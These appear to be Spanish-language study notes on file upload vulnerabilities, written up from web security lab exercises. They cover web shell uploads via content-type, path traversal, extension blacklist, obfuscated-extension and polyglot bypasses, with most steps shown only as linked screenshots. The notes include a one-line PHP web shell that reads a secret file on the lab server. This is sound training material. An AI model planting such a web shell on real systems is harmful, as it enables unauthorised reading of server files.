Las vulnerabilidades de carga de archivos (File Upload Vulnerabilities) son fallos de seguridad que ocurren cuando una aplicación permite a los usuarios cargar archivos sin verificar correctamente su contenido o el tipo de archivo. Estas vulnerabilidades pueden ser explotadas por atacantes para cargar archivos maliciosos, como scripts ejecutables, que pueden ser utilizados para comprometer el sistema.

### Tipos comunes de File Upload Vulnerabilities:

1. **Ejecución remota de código**: Un atacante carga un archivo con código malicioso (por ejemplo, un script PHP) que, al ser ejecutado por el servidor, le permite tomar control del sistema.
    
2. **Desbordamiento de memoria**: Archivos grandes pueden ser subidos para intentar saturar el sistema, causando un desbordamiento de memoria y potencialmente permitiendo la ejecución de código o denegación de servicio.
    
3. **Bypass de validación**: Algunos atacantes pueden evadir las validaciones de tipo de archivo (como la extensión o el tipo MIME) para subir archivos peligrosos que la aplicación no filtra correctamente.
    
4. **Inyección de archivos**: Consiste en cargar archivos que contienen comandos o datos que se inyectan en el sistema, aprovechando funciones vulnerables del servidor.
# Ejecución remota de código a través de carga de shell web

![[01.EjecucionRemota.png]]
![[02.EjecucionRemota.png]]
![[03.EjecucionRemota.png]]
![[04.EjecucionRemota.png]]
![[05.EjecucionRemota.png]]
![[06.EjecucionRemota.png]]
![[07.EjecucionRemota.png]]
![[08.EjecucionRemota.png]]

# Carga de shell web mediante omisión de restricción de tipo de contenido

![[01.CargaShelWebOmision.png]]
![[02.CargaShelWebOmision.png]]
# Carga de shell web mediante recorrido de ruta

![[01.CargaShellRecorridoDeRuta.png]]
![[02.CargaShellRecorridoDeRuta.png]]
![[03.CargaShellRecorridoDeRuta.png]]
![[04.CargaShellRecorridoDeRuta.png]]
![[05.CargaShellRecorridoDeRuta.png]]
![[06.CargaShellRecorridoDeRuta.png]]
![[07.CargaShellRecorridoDeRuta.png]]


# Carga de shell web mediante omisión de lista negra de extensiones

Cargue un shell web PHP básico y luego úselo para extraer el contenido del archivo `/home/carlos/secret`

![[01.ShellWeb.png]]
```php 
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
![[02.ShellWeb.png]]
![[03.ShellWeb.png]]
![[04.ShellWeb.png]]
![[05.ShellWeb.png]]

# Carga de shell web mediante extensión de archivo ofuscada

![[01.CargaShellOfuscada.png]]
![[02.CargaShellOfuscada.png]]
![[03.CargaShellOfuscada.png]]
![[04.CargaShellOfuscada.png]]
![[05.CargaShellOfuscada.png]]
![[06.CargaShellOfuscada.png]]
![[07.CargaShellOfuscada.png]]
![[08.CargaShellOfuscada.png]]

# Ejecución remota de código a través de la carga de un shell web políglota

![[Pasted image 20240814002920.png]]
![[Pasted image 20240814170323.png]]
![[Pasted image 20240814171519.png]]
![[Pasted image 20240814171608.png]]
![[Pasted image 20240814171748.png]]
![[Pasted image 20240814172009.png]]
![[Pasted image 20240814171827.png]]
![[Pasted image 20240814172032.png]]
![[Pasted image 20240814172304.png]]
![[Pasted image 20240814172323.png]]



